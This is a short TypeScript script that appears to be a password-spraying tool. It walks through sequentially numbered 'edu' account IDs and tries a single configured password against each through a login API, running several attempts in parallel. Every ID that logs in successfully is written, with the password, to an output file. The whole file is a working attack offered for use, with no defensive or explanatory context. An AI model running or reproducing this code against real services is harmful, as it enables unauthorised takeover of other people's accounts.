import { logger } from '../Logger';
import { config } from '../config';
import { login } from './api';
import fs from 'fs';

async function testAccount(id: string) {
    var token = await login(id, config.password);
    if (!token) return logger.remove(id);
    logger.add(id);
    fs.appendFile(config.outFile, `${id} ${config.password}` + '\n', () => {});
}

export default async function findAccount() {
    for (
        let currentId = config.base;
        currentId < config.base + config.findNumber;
        currentId++
    ) {
        var testQueue: Promise<void>[] = [];
        for (let i = 0; i < config.asyncNumber; i++) {
            testQueue.push(testAccount('edu' + currentId));
            currentId++;
        }
        await Promise.all(testQueue);
    }
}
